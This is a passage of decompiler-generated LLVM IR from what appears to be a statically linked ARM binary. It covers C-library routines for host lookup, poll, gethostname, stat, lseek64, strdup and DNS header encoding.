  store i32 %v1_1e2fc, i32* @r8, align 4
  %v4_1e300 = inttoptr i32 %v2_1e2ec to i32*
  store i32 %v0_1e1e0, i32* %v4_1e300, align 4
  %v0_1e304 = load i32, i32* @sl, align 4
  store i32 %v0_1e304, i32* %r0.global-to-local, align 4
  %v0_1e308 = load i32, i32* @r4, align 4
  %v1_1e308 = load i32, i32* @fp, align 4
  %v2_1e308 = add i32 %v1_1e308, 4
  %v3_1e308 = inttoptr i32 %v2_1e308 to i32*
  store i32 %v0_1e308, i32* %v3_1e308, align 4
  %v0_1e30c = load i32, i32* @r8, align 4
  %v2_1e310 = inttoptr i32 %v0_1e304 to i8*
  %v3_1e310 = call i32 @inet_aton(i8* %v2_1e310, i32 %v0_1e30c)
  store i32 %v3_1e310, i32* %r0.global-to-local, align 4
  %v1_1e314 = load i32, i32* @r4, align 4
  %v9_1e314 = icmp eq i32 %v3_1e310, %v1_1e314
  br i1 %v9_1e314, label %dec_label_pc_1e358, label %dec_label_pc_1e31c

dec_label_pc_1e31c:                               ; preds = %dec_label_pc_1e2ec
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_1e320 = load i32, i32* @r7, align 4
  %v2_1e320 = add i32 %v1_1e320, 8
  %v3_1e320 = inttoptr i32 %v2_1e320 to i32*
  store i32 2, i32* %v3_1e320, align 4
  %v0_1e324 = load i32, i32* %r3.global-to-local, align 4
  %v2_1e324 = mul i32 %v0_1e324, 2
  %v1_1e328 = load i32, i32* @r7, align 4
  %v2_1e328 = add i32 %v1_1e328, 12
  %v3_1e328 = inttoptr i32 %v2_1e328 to i32*
  store i32 %v2_1e324, i32* %v3_1e328, align 4
  %v3_1e32c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1e32c, i32* %r2.global-to-local, align 4
  store i32 %v0_1e1e0, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_1e338 = load i32, i32* @r4, align 4
  store i32 %v0_1e338, i32* @r5, align 4
  %v0_1e33c = load i32, i32* @r8, align 4
  %v1_1e33c = load i32, i32* @fp, align 4
  %v2_1e33c = add i32 %v1_1e33c, 8
  %v3_1e33c = inttoptr i32 %v2_1e33c to i32*
  store i32 %v0_1e33c, i32* %v3_1e33c, align 4
  %v0_1e340 = load i32, i32* @r7, align 4
  %v1_1e340 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e340 = inttoptr i32 %v1_1e340 to i32*
  store i32 %v0_1e340, i32* %v2_1e340, align 4
  %v0_1e344 = load i32, i32* @r7, align 4
  %v1_1e344 = inttoptr i32 %v0_1e344 to i32*
  %v2_1e344 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_1e344, i32* %v1_1e344, align 4
  %v3_1e344 = add i32 %v0_1e344, 4
  %v4_1e344 = inttoptr i32 %v3_1e344 to i32*
  %v5_1e344 = load i32, i32* @fp, align 4
  store i32 %v5_1e344, i32* %v4_1e344, align 4
  %v0_1e348 = load i32, i32* @r6, align 4
  %v1_1e348 = load i32, i32* @r7, align 4
  %v2_1e348 = add i32 %v1_1e348, 16
  %v3_1e348 = inttoptr i32 %v2_1e348 to i32*
  store i32 %v0_1e348, i32* %v3_1e348, align 4
  %v0_1e34c = load i32, i32* @r4, align 4
  %v1_1e34c = load i32, i32* @ip, align 4
  %v2_1e34c = inttoptr i32 %v1_1e34c to i32*
  store i32 %v0_1e34c, i32* %v2_1e34c, align 4
  %v0_1e350 = load i32, i32* @r4, align 4
  %v1_1e350 = load i32, i32* @r6, align 4
  %v2_1e350 = add i32 %v1_1e350, 4
  %v3_1e350 = inttoptr i32 %v2_1e350 to i32*
  store i32 %v0_1e350, i32* %v3_1e350, align 4
  br label %dec_label_pc_1e4c0

dec_label_pc_1e358:                               ; preds = %dec_label_pc_1e2ec
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_1e35c = icmp eq i32 %storemerge2, 0
  br i1 %v2_1e35c, label %dec_label_pc_1e374, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1e358
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1e24c, align 4
  br label %dec_label_pc_1e4c0

dec_label_pc_1e374:                               ; preds = %dec_label_pc_1e358
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_1e380 = load i32, i32* @sl, align 4
  store i32 %v0_1e380, i32* %r0.global-to-local, align 4
  %v2_1e388 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1e388, i32* %r2.global-to-local, align 4
  %v2_1e38c = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1e38c, i32* %r3.global-to-local, align 4
  %v7_1e398 = inttoptr i32 %v0_1e380 to i8*
  %v8_1e398 = call i32 @__dns_lookup(i8* %v7_1e398, i32 1, i32 %v2_1e388, i32 %v2_1e38c)
  store i32 %v8_1e398, i32* %r0.global-to-local, align 4
  %v1_1e39c = icmp slt i32 %v8_1e398, 0
  br i1 %v1_1e39c, label %.thread, label %dec_label_pc_1e3b4

.thread:                                          ; preds = %dec_label_pc_1e374
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1e24c, align 4
  br label %dec_label_pc_1e4c0

dec_label_pc_1e3b4:                               ; preds = %dec_label_pc_1e374
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_1e3b8 = icmp eq i32 %tmp12, 1
  br i1 %v7_1e3b8, label %dec_label_pc_1e3c0, label %dec_label_pc_1e498

dec_label_pc_1e3c0:                               ; preds = %dec_label_pc_1e3b4
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_1e3d8 = load i32, i32* @r5, align 4
  %v2_1e3d8 = add i32 %v0_1e3d8, -12
  store i32 %v2_1e3d8, i32* @r8, align 4
  %v8_1e3d8 = icmp slt i32 %v2_1e3d8, 0
  br i1 %v8_1e3d8, label %bb37, label %dec_label_pc_1e3e4

bb37:                                             ; preds = %dec_label_pc_1e3c0
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1e4a8

dec_label_pc_1e3e4:                               ; preds = %dec_label_pc_1e3c0
  %v0_1e3e4 = load i32, i32* @r6, align 4
  store i32 %v0_1e3e4, i32* @r1, align 4
  %v2_1e3e8 = add i32 %v0_1e3e4, 12
  store i32 %v2_1e3e8, i32* @r0, align 4
  %v2_1e3ec = call i32 @memmove(i32 %v2_1e3e8, i32 %v0_1e3e4)
  %v0_1e3f0 = load i32, i32* @fp, align 4
  %v1_1e3f0 = add i32 %v0_1e3f0, 4
  store i32 %v1_1e3f0, i32* @r3, align 4
  %v1_1e3f4 = load i32, i32* @r4, align 4
  %v2_1e3f4 = add i32 %v1_1e3f4, %v1_1e3f0
  store i32 %v2_1e3f4, i32* @r5, align 4
  store i32 %v2_1e3f4, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_1e404 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1e410.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1e410

dec_label_pc_1e410:                               ; preds = %dec_label_pc_1e410, %dec_label_pc_1e3e4
  %v0_1e410 = phi i32 [ %v0_1e410.pre, %dec_label_pc_1e3e4 ], [ %v1_1e414, %dec_label_pc_1e410 ]
  %v1_1e410 = load i32, i32* @r6, align 4
  %v7_1e410 = inttoptr i32 %v1_1e410 to i32*
  store i32 %v0_1e410, i32* %v7_1e410, align 4
  %v0_1e414 = load i32, i32* @r5, align 4
  %v1_1e414 = add i32 %v0_1e414, 4
  store i32 %v1_1e414, i32* @r5, align 4
  %v0_1e418 = load i32, i32* %r0.global-to-local, align 4
  %v1_1e418 = add i32 %v0_1e418, 1
  store i32 %v1_1e418, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_1e418, 0
  br i1 %tmp38, label %dec_label_pc_1e410, label %dec_label_pc_1e428

dec_label_pc_1e428:                               ; preds = %dec_label_pc_1e410
  %v3_1e428 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1e428, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1e430 = icmp eq i32 %v3_1e428, 0
  %v1_1e434 = load i32, i32* @r6, align 4
  %v5_1e434 = mul i32 %v1_1e418, 4
  %v6_1e434 = add i32 %v1_1e434, %v5_1e434
  %v7_1e434 = inttoptr i32 %v6_1e434 to i32*
  store i32 0, i32* %v7_1e434, align 4
  br i1 %v2_1e430, label %dec_label_pc_1e464, label %dec_label_pc_1e43c

dec_label_pc_1e43c:                               ; preds = %dec_label_pc_1e428
  %v0_1e43c = load i32, i32* @r4, align 4
  %v1_1e43c = inttoptr i32 %v0_1e43c to i8*
  store i32 %v0_1e43c, i32* %r0.global-to-local, align 4
  %v3_1e440 = call i32 @strlen(i8* %v1_1e43c)
  store i32 %v3_1e440, i32* %r0.global-to-local, align 4
  %v0_1e444 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_1e444, %v3_1e440
  br i1 %tmp, label %dec_label_pc_1e44c, label %dec_label_pc_1e464

dec_label_pc_1e44c:                               ; preds = %dec_label_pc_1e43c
  %v0_1e44c = load i32, i32* @r4, align 4
  store i32 %v0_1e44c, i32* @r1, align 4
  %v0_1e450 = load i32, i32* @r5, align 4
  store i32 %v0_1e450, i32* %r0.global-to-local, align 4
  %v2_1e454 = inttoptr i32 %v0_1e450 to i8*
  %v3_1e454 = call i32 @strcpy(i8* %v2_1e454, i32 %v0_1e44c)
  store i32 %v3_1e454, i32* %r0.global-to-local, align 4
  %v0_1e458 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1e464

dec_label_pc_1e464:                               ; preds = %dec_label_pc_1e43c, %dec_label_pc_1e428, %dec_label_pc_1e44c
  %storemerge1 = phi i32 [ %v0_1e458, %dec_label_pc_1e44c ], [ %v0_1e1e0, %dec_label_pc_1e43c ], [ %v0_1e1e0, %dec_label_pc_1e428 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1e468 = load i32, i32* @r7, align 4
  %v2_1e468 = add i32 %v1_1e468, 8
  %v3_1e468 = inttoptr i32 %v2_1e468 to i32*
  store i32 2, i32* %v3_1e468, align 4
  %v0_1e46c = load i32, i32* %r2.global-to-local, align 4
  %v2_1e46c = mul i32 %v0_1e46c, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1e474 = load i32, i32* @r7, align 4
  %v2_1e474 = add i32 %v1_1e474, 12
  %v3_1e474 = inttoptr i32 %v2_1e474 to i32*
  store i32 %v2_1e46c, i32* %v3_1e474, align 4
  %v3_1e478 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1e478, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_1e480 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1e480, i32* @r5, align 4
  %v0_1e484 = load i32, i32* @r7, align 4
  %v2_1e484 = inttoptr i32 %v3_1e478 to i32*
  store i32 %v0_1e484, i32* %v2_1e484, align 4
  %v0_1e488 = load i32, i32* @r7, align 4
  %v1_1e488 = inttoptr i32 %v0_1e488 to i32*
  %v2_1e488 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1e488, i32* %v1_1e488, align 4
  %v3_1e488 = add i32 %v0_1e488, 4
  %v4_1e488 = inttoptr i32 %v3_1e488 to i32*
  %v5_1e488 = load i32, i32* @fp, align 4
  store i32 %v5_1e488, i32* %v4_1e488, align 4
  %v0_1e48c = load i32, i32* @r6, align 4
  %v1_1e48c = load i32, i32* @r7, align 4
  %v2_1e48c = add i32 %v1_1e48c, 16
  %v3_1e48c = inttoptr i32 %v2_1e48c to i32*
  store i32 %v0_1e48c, i32* %v3_1e48c, align 4
  %v0_1e490 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e490 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e490 = inttoptr i32 %v1_1e490 to i32*
  store i32 %v0_1e490, i32* %v2_1e490, align 4
  br label %dec_label_pc_1e4a8

dec_label_pc_1e498:                               ; preds = %dec_label_pc_1e3b4
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_1e24c, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_1e4a8

dec_label_pc_1e4a8:                               ; preds = %bb37, %dec_label_pc_1e464, %dec_label_pc_1e498
  %v3_1e4a8 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1e4a8, i32* @r0, align 4
  %v0_1e4ac = call i32 @free()
  %v3_1e4b0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1e4b0, i32* @r0, align 4
  %v0_1e4b4 = call i32 @free()
  store i32 %v0_1e4b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e4c0

dec_label_pc_1e4bc:                               ; preds = %dec_label_pc_1e294, %dec_label_pc_1e2b8
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1e4c0

dec_label_pc_1e4c0:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_1e280, %dec_label_pc_1e260, %dec_label_pc_1e4a8, %dec_label_pc_1e31c, %dec_label_pc_1e4bc
  %v0_1e4c0 = load i32, i32* @r5, align 4
  store i32 %v0_1e4c0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1e4c0

; uselistorder directives
  uselistorder i32 %v0_1e43c, { 1, 0 }
  uselistorder i32 %v1_1e418, { 1, 0, 2 }
  uselistorder i32 %v1_1e414, { 1, 0 }
  uselistorder i32 %v0_1e3e4, { 1, 0, 2 }
  uselistorder i32 %v2_1e3d8, { 1, 0 }
  uselistorder i32 %v1_1e2d8, { 2, 1, 0 }
  uselistorder i32 %v1_1e2cc, { 1, 0 }
  uselistorder i32 %v0_1e2a0, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_1e24c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1e1ec, { 1, 0 }
  uselistorder i32 %v0_1e1e0, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 19, 20, 4, 3, 6, 5, 8, 7, 0, 10, 9, 12, 11, 13, 15, 14, 17, 16, 18 }
  uselistorder i32 ()* @free, { 21, 20, 19, 18, 17, 16, 10, 9, 8, 7, 6, 15, 14, 13, 12, 5, 4, 3, 2, 11, 22, 29, 28, 27, 1, 26, 25, 24, 23, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_1e4c0, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_1e4bc, { 1, 0 }
  uselistorder label %dec_label_pc_1e4a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1e464, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1e294, { 2, 0, 1 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1e4d0 = load i32, i32* @r7, align 4
  store i32 %v3_1e4d0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1e4f8, label %dec_label_pc_1e4e8

dec_label_pc_1e4e8:                               ; preds = %entry
  %v0_1e4e8 = call i32 @__GI___errno_location()
  %v0_1e4ec = load i32, i32* %r7.global-to-local, align 4
  %v1_1e4ec = sub i32 0, %v0_1e4ec
  %v2_1e4f0 = inttoptr i32 %v0_1e4e8 to i32*
  store i32 %v1_1e4ec, i32* %v2_1e4f0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1e4fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1e4f8

dec_label_pc_1e4f8:                               ; preds = %entry, %dec_label_pc_1e4e8
  %v2_1e4fc = phi i32 [ %v3_1e4d0, %entry ], [ %v2_1e4fc.pre, %dec_label_pc_1e4e8 ]
  %v0_1e4f8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1e4e8 ]
  store i32 %v2_1e4fc, i32* @r7, align 4
  ret i32 %v0_1e4f8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1e4f8, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_1e510 = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1e520 = call i32 @uname(i32 %v2_1e510)
  %v7_1e524 = icmp eq i32 %v1_1e520, -1
  br i1 %v7_1e524, label %bb, label %dec_label_pc_1e530

bb:                                               ; preds = %entry
  store i32 %v1_1e520, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e56c

dec_label_pc_1e530:                               ; preds = %entry
  %v2_1e530 = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_1e538 = call i32 @strlen(i8* %tmp10)
  %v1_1e53c = add i32 %v3_1e538, 1
  %v1_1e540 = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1e53c, %v1_1e540
  br i1 %tmp, label %dec_label_pc_1e548, label %dec_label_pc_1e55c

dec_label_pc_1e548:                               ; preds = %dec_label_pc_1e530
  %v0_1e548 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1e554 = inttoptr i32 %v0_1e548 to i32*
  store i32 22, i32* %v2_1e554, align 4
  %v0_1e56c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e56c

dec_label_pc_1e55c:                               ; preds = %dec_label_pc_1e530
  %v0_1e55c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_1e530, i32* @r1, align 4
  %v2_1e564 = inttoptr i32 %v0_1e55c to i8*
  %v3_1e564 = call i32 @strcpy(i8* %v2_1e564, i32 %v2_1e530)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e56c

dec_label_pc_1e56c:                               ; preds = %bb, %dec_label_pc_1e548, %dec_label_pc_1e55c
  %v0_1e56c = phi i32 [ %v1_1e520, %bb ], [ %v0_1e56c.pre, %dec_label_pc_1e548 ], [ 0, %dec_label_pc_1e55c ]
  ret i32 %v0_1e56c

; uselistorder directives
  uselistorder i32 %v2_1e530, { 1, 0 }
  uselistorder i32 %v1_1e520, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9 }
  uselistorder i32 22, { 3, 16, 4, 5, 18, 0, 17, 6, 7, 8, 9, 14, 10, 11, 12, 19, 13, 1, 2, 15 }
  uselistorder label %dec_label_pc_1e56c, { 2, 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1e5b4, label %dec_label_pc_1e5a0

dec_label_pc_1e5a0:                               ; preds = %entry
  %v0_1e5a0 = call i32 @__GI___errno_location()
  %v0_1e5a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1e5a4 = sub i32 0, %v0_1e5a4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1e5ac = inttoptr i32 %v0_1e5a0 to i32*
  store i32 %v1_1e5a4, i32* %v2_1e5ac, align 4
  br label %dec_label_pc_1e5c4

dec_label_pc_1e5b4:                               ; preds = %entry
  %v2_1e5b4 = icmp eq i32 %arg1, 0
  br i1 %v2_1e5b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1e5b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1e5b4, %bb
  call void @__pseudo_cond_branch(i1 %v2_1e5b4, i32 ptrtoint (i32* @global_var_1c688.1214 to i32))
  br label %dec_label_pc_1e5c4

dec_label_pc_1e5c4:                               ; preds = %dec_label_pc_1e5a0, %.thread
  %v0_1e5c4 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1e5c4

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1e5c4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1e614, label %dec_label_pc_1e600

dec_label_pc_1e600:                               ; preds = %entry
  %v0_1e600 = call i32 @__GI___errno_location()
  %v0_1e604 = load i32, i32* %r4.global-to-local, align 4
  %v1_1e604 = sub i32 0, %v0_1e604
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1e60c = inttoptr i32 %v0_1e600 to i32*
  store i32 %v1_1e604, i32* %v2_1e60c, align 4
  %v0_1e61c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e61c

dec_label_pc_1e614:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_1e614 = icmp eq i32 %arg1, 0
  br i1 %v2_1e614, label %dec_label_pc_1e628, label %dec_label_pc_1e61c

dec_label_pc_1e61c:                               ; preds = %dec_label_pc_1e614, %dec_label_pc_1e600
  %v0_1e61c = phi i32 [ %arg1, %dec_label_pc_1e614 ], [ %v0_1e61c.pre, %dec_label_pc_1e600 ]
  br label %dec_label_pc_1e62c

dec_label_pc_1e628:                               ; preds = %dec_label_pc_1e614
  br label %dec_label_pc_1e62c

dec_label_pc_1e62c:                               ; preds = %dec_label_pc_1e61c, %dec_label_pc_1e628
  %v1_1e634 = phi i32 [ %v0_1e61c, %dec_label_pc_1e61c ], [ %tmp8, %dec_label_pc_1e628 ]
  ret i32 %v1_1e634

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1e62c, { 1, 0 }
}

define i32 @function_1e638(i32 %arg1) local_unnamed_addr {
dec_label_pc_1e638:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1e640 = load i32, i32* @r0, align 4
  %v1_1e640 = load i32, i32* @r1, align 4
  %v2_1e640 = inttoptr i32 %v0_1e640 to i8*
  %v3_1e640 = call i32 @_memcpy(i8* %v2_1e640, i32 %v1_1e640)
  ret i32 %v3_1e640

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1e650 = load i32, i32* @r4, align 4
  store i32 %v3_1e650, i32* %stack_var_-16, align 4
  %v9_1e650 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_1e658 = call i32 @strlen(i8* %arg1)
  %v1_1e65c = add i32 %v3_1e658, 1
  store i32 %v1_1e65c, i32* @r4, align 4
  %v1_1e664 = call i32 @malloc(i32 %v1_1e65c)
  store i32 %v1_1e664, i32* %r5.global-to-local, align 4
  %v2_1e668 = icmp eq i32 %v1_1e664, 0
  br i1 %v2_1e668, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_1e674 = xor i1 %v2_1e668, true
  call void @__pseudo_cond_branch(i1 %v1_1e674, i32 ptrtoint (i32* @global_var_15a40.1075 to i32))
  %v0_1e678 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e67c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1e67c, i32* @r4, align 4
  store i32 %v9_1e650, i32* @r6, align 4
  ret i32 %v0_1e678

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 12, 11, 10, 4, 3, 9, 8, 7, 13, 6, 5, 14, 23, 1, 22, 21, 20, 19, 18, 17, 16, 15, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_1e688 = load i32, i32* @lr, align 4
  store i32 %v0_1e688, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_1e694 = icmp sgt i32 %arg3, 11
  br i1 %v7_1e694, label %dec_label_pc_1e69c, label %dec_label_pc_1e768

dec_label_pc_1e69c:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_1e69c = add i32 %tmp, 1
  %v2_1e69c = inttoptr i32 %v1_1e69c to i8*
  %v3_1e69c = load i8, i8* %v2_1e69c, align 1
  store i8 %v3_1e69c, i8* %tmp16, align 1
  %v0_1e6a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e6a4 = inttoptr i32 %v0_1e6a4 to i32*
  %v2_1e6a4 = load i32, i32* %v1_1e6a4, align 4
  %v1_1e6a8 = trunc i32 %v2_1e6a4 to i8
  %v4_1e6a8 = add i32 %arg2, 1
  %v5_1e6a8 = inttoptr i32 %v4_1e6a8 to i8*
  store i8 %v1_1e6a8, i8* %v5_1e6a8, align 1
  %v0_1e6ac = load i32, i32* %ip.global-to-local, align 4
  %v1_1e6ac = add i32 %v0_1e6ac, 8
  %v2_1e6ac = inttoptr i32 %v1_1e6ac to i32*
  %v3_1e6ac = load i32, i32* %v2_1e6ac, align 4
  %v1_1e6b0 = add i32 %v0_1e6ac, 20
  %v2_1e6b0 = inttoptr i32 %v1_1e6b0 to i32*
  %v3_1e6b0 = load i32, i32* %v2_1e6b0, align 4
  %v1_1e6b4 = add i32 %v0_1e6ac, 4
  %v2_1e6b4 = inttoptr i32 %v1_1e6b4 to i32*
  %v3_1e6b4 = load i32, i32* %v2_1e6b4, align 4
  %v1_1e6b8 = add i32 %v0_1e6ac, 12
  %v2_1e6b8 = inttoptr i32 %v1_1e6b8 to i32*
  %v3_1e6b8 = load i32, i32* %v2_1e6b8, align 4
  %v2_1e6bc = icmp eq i32 %v3_1e6b0, 0
  br i1 %v2_1e6bc, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1e69c
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1e69c, %bb
  %v0_1e6cc = phi i32 [ 0, %dec_label_pc_1e69c ], [ 1, %bb ]
  %v1_1e6c4 = urem i32 %v3_1e6ac, 16
  %v2_1e6c8 = icmp eq i32 %v3_1e6b4, 0
  %v4_1e6cc = mul nuw nsw i32 %v1_1e6c4, 8
  %v5_1e6cc = or i32 %v0_1e6cc, %v4_1e6cc
  %v1_1e6d0 = add i32 %v0_1e6ac, 16
  %v2_1e6d0 = inttoptr i32 %v1_1e6d0 to i32*
  %v3_1e6d0 = load i32, i32* %v2_1e6d0, align 4
  %. = select i1 %v2_1e6c8, i32 0, i32 128
  %v2_1e6dc = icmp eq i32 %v3_1e6b8, 0
  %storemerge11 = select i1 %v2_1e6dc, i32 0, i32 4
  %v2_1e6e8 = or i32 %v5_1e6cc, %.
  %v2_1e6ec = icmp eq i32 %v3_1e6d0, 0
  %.26 = select i1 %v2_1e6ec, i32 0, i32 2
  %v2_1e6f8 = or i32 %v2_1e6e8, %storemerge11
  %v2_1e6fc = or i32 %v2_1e6f8, %.26
  %v1_1e700 = trunc i32 %v2_1e6fc to i8
  %v2_1e700 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e700 = add i32 %v2_1e700, 2
  %v4_1e700 = inttoptr i32 %v3_1e700 to i8*
  store i8 %v1_1e700, i8* %v4_1e700, align 1
  %v0_1e704 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e704 = add i32 %v0_1e704, 24
  %v1_1e708 = inttoptr i32 %v1_1e704 to i32*
  %v2_1e708 = load i32, i32* %v1_1e708, align 4
  %v3_1e708 = add i32 %v0_1e704, 28
  %v4_1e708 = inttoptr i32 %v3_1e708 to i32*
  %v5_1e708 = load i32, i32* %v4_1e708, align 4
